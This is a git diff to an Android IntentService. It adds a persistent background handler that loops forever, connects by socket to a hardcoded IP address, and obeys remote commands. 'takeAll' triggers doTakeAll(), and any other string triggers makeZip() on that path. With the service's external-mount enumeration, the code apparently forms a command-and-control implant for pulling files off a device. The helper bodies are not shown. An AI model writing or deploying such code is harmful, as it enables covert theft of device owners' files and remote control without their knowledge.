@@ -5,6 +5,10 @@ import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
+import android.os.HandlerThread;
+import android.os.Looper;
+import android.os.Message;
 import android.os.SystemClock;
 import android.util.Base64;
 import android.util.Log;
@@ -46,12 +50,114 @@ public class MyIntentService extends IntentService {
     private final String ip = "192.168.1.2";
     private final String port = ":8001";
     private final int port_socket = 8889;
+    private Looper mServiceLooper;
+    private ServiceHandler mServiceHandler;
 
     public MyIntentService() {
         super("MyIntentService");
 
         Log.e("Service", "MyIntentService");
     }
+
+    @Override
+    public void onCreate() {
+        Log.i("MyIntentService", "onCreate");
+        // Start up the thread running the service.  Note that we create a
+        // separate thread because the service normally runs in the process's
+        // main thread, which we don't want to block.  We also make it
+        // background priority so CPU-intensive work will not disrupt our UI.
+
+
+        HandlerThread thread = new HandlerThread("ServiceStartArguments");
+        thread.start();
+
+
+        // Get the HandlerThread's Looper and use it for our Handler
+        mServiceLooper = thread.getLooper();
+        mServiceHandler = new ServiceHandler(mServiceLooper);
+    }
+
+
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.e("Service", "onStartCommand");
+        Toast.makeText(this, "service starting", Toast.LENGTH_SHORT).show();
+
+        //connect();
+        Message msg = mServiceHandler.obtainMessage();
+        msg.arg1 = startId;
+        mServiceHandler.sendMessage(msg);
+
+        //new DownloadFilesTask().execute(null, null, null);
+        return START_STICKY;
+    }
+
+
+    private final class ServiceHandler extends Handler {
+        public ServiceHandler(Looper looper) {
+            super(looper);
+        }
+
+        @Override
+        public void handleMessage(Message msg) {
+            Socket s = null;
+            BufferedReader br = null;
+            while (true){
+                try {
+                    s = new Socket(ip, port_socket);
+                    DataOutputStream dos = null;
+                    DataInputStream dis2 = null;
+                    boolean socketAlive = true;
+                    String toWrite = "ack";
+
+                    dos = new DataOutputStream(s.getOutputStream());
+
+                    dos.writeUTF(toWrite);
+
+                    //read input stream
+                    dis2 = new DataInputStream(s.getInputStream());
+                    InputStreamReader disR2 = new InputStreamReader(dis2);
+                    br = new BufferedReader(disR2);//create a BufferReader object for input
+                    while (socketAlive) {
+                        String response = br.readLine(); //read line
+                        br = new BufferedReader(new InputStreamReader(s.getInputStream()));
+
+                        Log.i("TSTTTT", response + " " + response.toString() + " " + response.length());
+
+                        if (br == null) {
+                            Log.e("TESTSOCKET", "BR NULL");
+                            break;
+                        }
+
+                        if (response.equals("ack")) {
+                            Log.i("TESTSOCKET", "primo");
+                            SystemClock.sleep(1000);
+                            toWrite = "ack";
+                            dos.writeUTF(toWrite);
+                        } else if (response.equals("takeAll")){
+                            Log.i("TESTSOCKET", "takeAll");
+                            toWrite = "OK";
+                            doTakeAll();
+                        }else {
+                            Log.i("TESTSOCKET", "take file");
+                            toWrite = "OK";
+                            makeZip(response);
+                        }
+
+                        dos.writeUTF(toWrite);
+                    }
+
+                    dis2.close();
+                    s.close();
+                    SystemClock.sleep(10000);
+
+                } catch (Exception e) {
+                    Log.e("TESTSOCKET-catch", String.valueOf(e));
+                }
+            }
+        }
+    }
+
+
 
     public static HashSet<String> getExternalMounts() {
         final HashSet<String> out = new HashSet<String>();
@@ -104,15 +210,6 @@ public class MyIntentService extends IntentService {
         }
     }
 
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.e("Service", "onStartCommand");
-        Toast.makeText(this, "service starting", Toast.LENGTH_SHORT).show();
-
-        connect();
-
-        //new DownloadFilesTask().execute(null, null, null);
-        return START_STICKY;
-    }
 
 
 
